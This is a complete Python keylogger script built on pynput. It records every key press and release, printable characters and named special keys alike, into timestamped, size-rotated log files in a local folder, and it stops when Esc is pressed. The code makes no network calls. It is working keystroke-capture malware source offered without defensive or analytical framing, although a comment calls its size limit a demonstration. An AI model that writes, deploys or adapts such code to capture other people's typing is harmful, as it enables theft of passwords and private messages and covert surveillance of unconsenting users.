import os
import logging
from datetime import datetime
from pynput.keyboard import Key, Listener

# Directory and Log File Setup
log_dir = "keylogs"
if not os.path.exists(log_dir):
    os.makedirs(log_dir)

# Configurations
MAX_LOG_FILE_SIZE = 5 * 1024  # 5KB limit for demonstration
LOG_FILE_TEMPLATE = os.path.join(log_dir, "keylog_session_{timestamp}.txt")

def create_logger():
    """Creates a logger with session-specific configurations."""
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    log_file = LOG_FILE_TEMPLATE.format(timestamp=timestamp)
    logger = logging.getLogger(f"Keylogger_{timestamp}")
    handler = logging.FileHandler(log_file)
    formatter = logging.Formatter('%(asctime)s - %(message)s', "%Y-%m-%d %H:%M:%S")
    handler.setFormatter(formatter)
    logger.addHandler(handler)
    logger.setLevel(logging.DEBUG)
    logger.propagate = False
    return logger, log_file

logger, log_file = create_logger()

def rotate_log():
    """Rotates the log file if it exceeds the defined MAX_LOG_FILE_SIZE."""
    global logger, log_file
    if os.path.getsize(log_file) > MAX_LOG_FILE_SIZE:
        logger.info("Rotating log file due to size limit.")
        logger, log_file = create_logger()

def log_key_event(event_type, key):
    """Logs key press/release events with enhanced formatting."""
    try:
        rotate_log()
        if hasattr(key, 'char') and key.char:  # Printable keys
            logger.info(f"{event_type}: '{key.char}'")
        else:  # Special keys
            special_keys = {
                Key.space: "Space",
                Key.enter: "Enter",
                Key.backspace: "Backspace",
                Key.tab: "Tab",
                Key.shift: "Shift",
                Key.ctrl_l: "Left Control",
                Key.ctrl_r: "Right Control",
                Key.alt_l: "Left Alt",
                Key.alt_r: "Right Alt",
                Key.caps_lock: "Caps Lock",
                Key.esc: "Escape",
                Key.up: "Up Arrow",
                Key.down: "Down Arrow",
                Key.left: "Left Arrow",
                Key.right: "Right Arrow"
            }
            key_name = special_keys.get(key, str(key))
            logger.info(f"{event_type}: [{key_name}]")
    except Exception as e:
        logger.error(f"Error logging {event_type} for key '{key}': {e}")

def on_press(key):
    log_key_event("Pressed", key)

def on_release(key):
    log_key_event("Released", key)
    if key == Key.esc:  # Stop key
        logger.info("Ending keylogger session.")
        return False

# Session Start
logger.info("Keylogger session started.")
logger.info("To end the session, press the 'Esc' key.")

# Start Listening to Keyboard Events
try:
    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()
except Exception as e:
    logger.error(f"An error occurred with the keylogger: {e}")

# Session End
logger.info("Keylogger session ended.")
